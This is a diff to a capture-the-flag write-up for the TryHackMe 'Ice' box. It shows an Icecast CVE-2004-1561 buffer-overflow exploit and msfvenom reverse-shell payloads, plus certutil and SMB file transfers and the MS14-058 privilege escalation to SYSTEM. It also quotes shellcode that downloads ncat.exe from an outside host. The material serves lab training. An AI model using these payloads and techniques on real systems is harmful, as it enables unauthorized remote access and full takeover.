@@ -2,15 +2,16 @@
 
 ## Summary
 Ice is an Active Directory machine which is the sequel to 'Blue' on  TryHackMe and the prequel to 'Buster'. 
-We start with nmap enumeration and discover the Icecast application on  an open port. 
+We start with nmap enumeration and discover the Icecast application on an open port. 
 After searching for exploits we manage to find a CVE in the form of an easy buffer overflow which we use to get a shell. 
-With the shell active we then use Windows Exploit Suggester to find a  privilege escalation pathway (after digging through a large number of options). 
-Finally we upload the exploit and our shell executable to the box and  have the former execute the latter in order to get a reverse shell as root. 
-Please note that we'll effectively be skipping most of the TryHackMe  room's steps in order to approach the box in this way.
+With the shell active we then use Windows Exploit Suggester to find a privilege escalation pathway (after digging through a large number of options). 
+Finally we upload the exploit and our shell executable to the box and have the former execute the latter in order to get a reverse shell as root. 
+Please note that we'll effectively be skipping most of the TryHackMe room's steps in order to approach the box in this way.
 
 ## Enumeration
 First we enumerate the server with nmap:
-```sudo nmap -sS -sV -oN ice.basic 10.10.170.34    
+```
+sudo nmap -sS -sV -oN ice.basic 10.10.170.34    
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-22 01:26 EDT
 Service scan Timing: About 50.00% done; ETC: 01:27 (0:00:17 remaining)
 Nmap scan report for 10.10.170.34
@@ -63,15 +64,13 @@ Shellcodes: No Results
 The 'Icecast 2.0.1 (Win32) - Remote Code Execution' exploits are the  most interesting two options here. A little bit of Googling leads us to  the following webpage: https://www.exploit-db.com/exploits/568
 This relates to the following CVE: CVE-2004-1561
 
-
-
 ## Initial Exploitation
 
-
-### The original buffer overflow script
+### The original buffer overflow code
 
 This is a simple buffer overflow attack that allows us to get remote code execution. It is made using C. The exploit is particularly nice (or dangerous) because we don't need to do any more complex buffer overflow techniques such as using CALL ESP or JMP ESP to  jump to a different part of the program's execution once we get the  buffer overflow to occur. Once we overflow the buffer it immediatly starts overwriting the return  address which allows us to insert shellcode into the program and get a  shell easily.
-The most interesting part of the C code begins from line 57 (we don't  display most of the shellcode here since it's around 30 lines long):
+
+The most interesting part of the C code begins from line 57 (we don't display most of the shellcode here since it's around 30 lines long):
 
 ```
 #define VER "0.1" 
@@ -97,7 +96,7 @@ char shellcode[] = "xEB"
 "x36x4Ax37x45x46x42x50x5A";
 ```
 
-Here we are basically feeding a sequence of 31 empty headers (the  "arn")  to Icecast to take up the first 31 locations in the buffer. 
+Here we are basically feeding a sequence of 31 empty headers (the  "arn") to Icecast to take up the first 31 locations in the buffer. 
 Then we use the "xcc" which is a null byte to signify we'd like to execute what follows. 
 This takes up the whole 32 bit buffer and any code we pass past this point will be taken as a part of a 'return' statement. 
 Unfortunately we can see here that the shell is attempting to download a binary from http://www.elitehaven.net/ncat.exe which is a location that no longer exists. 
@@ -105,9 +104,10 @@ Therefore this shell code will not work. But it gives us a nice idea of what we 
 
 ### Icecast.py
 After some more looking around for a working exploit, we find the following: https://github.com/ivanitlearning/CVE-2004-1561
-We can see that the author ivanitlearning (who is a legend) rewrote both the original .c version of the exploit as well as writing a Python version. 
+We can see that the author ivanitlearning (who is a legend) rewrote both the original C version of the exploit as well as writing a Python version. 
 In this case we'll be using the Python version which is called **Icecast.py**
 The usage is fairly simple. ivanitlearning recommends the following:
+
 ```
 Replace reverse shell shellcode in exploit, call it with argument for remote server and port.
 
@@ -118,13 +118,11 @@ Done!
 
 #### Generating shellcode with msfvenom
 
-Conveniently, the author includes the shellcode we'll want to run in the icecast.py file:
+Conveniently, the author includes the msfvenom command we'll want to run in the icecast.py file:
 ```msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=[Your IP] LPORT=[Your Port] -f python -b '\x00\x0a\x0d'```
 
 We use ```-a x86``` to ensure the payload is compatible with 32 bit architecture. ```--platform Windows``` ensures the shell is for a Windows device. 
-```-p windows/shell_reverse_tcp``` is used to define the payload. ```LHOST``` should be the VPN IP for the TryHackMe machine while ```LPORT``` is the port that we will
-listen on with netcat. ```-f python``` ensures that the format for the shellcode is in Python. ```-b '\x00\x0a\x0d'``` excludes three characters from the shellcode. These characters
-are the null byte, line feed and carriage return respectively.
+```-p windows/shell_reverse_tcp``` is used to define the payload. ```LHOST``` should be the VPN IP for the TryHackMe machine while ```LPORT``` is the port that we will listen on with netcat. ```-f python``` ensures that the format for the shellcode is in Python. ```-b '\x00\x0a\x0d'``` excludes three characters from the shellcode. These characters are the null byte, line feed and carriage return respectively.
 
 ```
 msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.4.18.56 LPORT=420 -f python -b '\x00\x0a\x0d'  
@@ -239,19 +237,22 @@ print("\nDone!")
 ```
 
 At this stage it's time to set up our netcat listener:
+
 ```
 nc -lvnp 420
 listening on [any] 420 ...
 ```
 
 And now we run the exploit:
+
 ```
 python3 icecast.py 10.10.170.34 8000
 
 Done!
 ```
 
-If we look back at our netcat listener now...
+If we look back at our netcat listener now:
+
 ```
 listening on [any] 420 ...                                    
 connect to [10.4.18.56] from (UNKNOWN) [10.10.170.34] 49284
@@ -340,8 +341,9 @@ sudo python windows-exploit-suggester.py -u
 ```
 
 Now we can run the exploit suggester against the sysinfo.txt file:
+
 ```
-python windows-exploit-suggester.py -d 2021-09-22-mssb.xls -i sysinfo.txt -l                                 1 ⨯ 
+python windows-exploit-suggester.py -d 2021-09-22-mssb.xls -i sysinfo.txt -l                                 
 [*] initiating winsploit version 3.3...                                                                              
 [*] database file detected as xls or xlsx based on extension                                                         
 [*] attempting to read from the systeminfo input file     
@@ -381,7 +383,144 @@ Firstly we need to create a new reverse shell that we can execute on the box loc
 msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.4.18.56 LPORT=421 -f exe -b '\x00\x0a\x0d' -o paperboy.exe
 ```
 
-Conclusion
+The only things we change here from the previous shell is to use a different port ```LPORT=421``` and ```-f exe``` to ensure we get an executable as the output. ```-o paperboy.exe``` outputs the shell a file with the name 'paperboy.exe'.
 
+Once we've done this we can grab the archive for the MS14-058 exploit from:
+https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS14-058/CVE-2014-4113-Exploit.rar
+
+We can extract this archive and grab Win64.exe from it. We move the paperboy.exe reverse shell and the Win64.exe file to a folder. Next we want to upload the files to the box. 
+
+##### Transferring exploit code to the box
+
+###### With CertUtil
+
+In this case from the directory ```~/Boxes/Ice/share``` on our attack box we can host a Python HTTP server with ```python3 -m http.server 8000```.
+
+From our shell on the box we type the following to transfer our files from our attack box to Ice:
+
+```
+C:\Users\Dark\Downloads>certutil.exe -urlcache -f http://10.4.18.56:8000/Win64.exe Win64.exe
+certutil.exe -urlcache -f http://10.4.18.56:8000/Win64.exe Win64.exe
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
+
+C:\Users\Dark\Downloads>certutil.exe -urlcache -f http://10.4.18.56:8000/paperboy.exe paperboy.exe
+certutil.exe -urlcache -f http://10.4.18.56:8000/paperboy.exe paperboy.exe
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
+```
+
+###### With smbserver.py
+First we can copy smbserver.py from https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py into our directory with the paperboy.exe and Win64.exe executables:
+
+```
+cp /opt/impacket/examples/smbserver.py ~/Boxes/Ice/share
+```
+
+or
+
+```
+cd ~/Boxes/Ice/share
+wget https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py
+```
+
+Then we can execute the script to start the server from that directory:
+
+```
+sudo python3 smbserver.py PAPERBOY .                                                                                                                                                                                               130 ⨯
+Impacket v0.9.24.dev1+20210917.161743.0297480b - Copyright 2021 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+```
+
+```PAPERBOY``` is the name of the share and the ```.``` represents the present working directory ```(pwd)```.
+
+Now from the reverse shell on Ice we can use ```net view``` to connect to the ```PAPERBOY``` samba share via our attack machines IP:
+
+```
+C:\Users\Dark\Downloads>net view \\10.4.18.56 
+net view \\10.4.18.56
+Shared resources at \\10.4.18.56
+
+(null)
+
+Share name  Type  Used as  Comment  
+
+-------------------------------------------------------------------------------
+PAPERBOY    Disk                    
+The command completed successfully.
+```
+
+```dir``` will list the files in our samba share:
+
+```
+C:\Users\Dark\Downloads>dir \\10.4.18.56\PAPERBOY
+
+dir \\10.4.18.56\PAPERBOY
+
+ Volume in drive \\10.4.18.56\PAPERBOY has no label.
+
+ Volume Serial Number is ABCD-EFAA
+
+ Directory of \\10.4.18.56\PAPERBOY
+
+09/23/2021  09:34 AM    <DIR>          .
+09/23/2021  09:35 AM    <DIR>          ..
+09/23/2021  09:34 AM            73,802 paperboy.exe
+09/23/2021  10:32 AM             4,379 smbserver.py
+05/04/2014  10:57 AM            55,808 Win64.exe
+               3 File(s)        142,181 bytes
+               2 Dir(s)  15,207,469,056 bytes free
+```
+
+Then we use ```copy``` to transfer the files across:
+
+```
+C:\Users\Dark\Downloads>copy \\10.4.18.56\PAPERBOY\paperboy.exe
+copy \\10.4.18.56\PAPERBOY\paperboy.exe
+        1 file(s) copied.
+
+C:\Users\Dark\Downloads>copy \\10.4.18.56\PAPERBOY\Win64.exe
+copy \\10.4.18.56\PAPERBOY\Win64.exe
+        1 file(s) copied.
+```
+
+#### Getting Root
+
+With the files transferred across all that there's left to do is start a new listener on a different port from the last one we used:
+
+```nc -lvnp 421```
+
+And then execute the Win64.exe binary and have it execute our reverse shell in turn:
+```
+C:\Users\Dark\Downloads>Win64.exe paperboy.exe
+Win64.exe paperboy.exe
+```
+
+If we look back at our listener now we will see that we've receieved a shell and are now **root** aka NT AUTHORITY\SYSTEM!:
+
+```
+listening on [any] 421 ...
+connect to [10.4.18.56] from (UNKNOWN) [10.10.82.92] 49198
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Users\Dark\Downloads>whoami
+whoami
+nt authority\system
+```
+
+## Conclusion & Credits
+This was a fun box to learn how to exploit manually and is a great test case for learning about a very simple buffer overflow.
+
+Thanks to the following for their work in creating some of the tools used and guiding me on their usage:
+* HackerSploit for their Ice Manual Exploitation video - https://www.youtube.com/watch?v=eIy69zUfbgI
+* Gitmaninc for the Win64.exe exploit code - https://github.com/Gitmaninc
+* Luigi Auriemma for the original exploit - http://aluigi.altervista.org/adv/iceexec-adv.txt
 
 
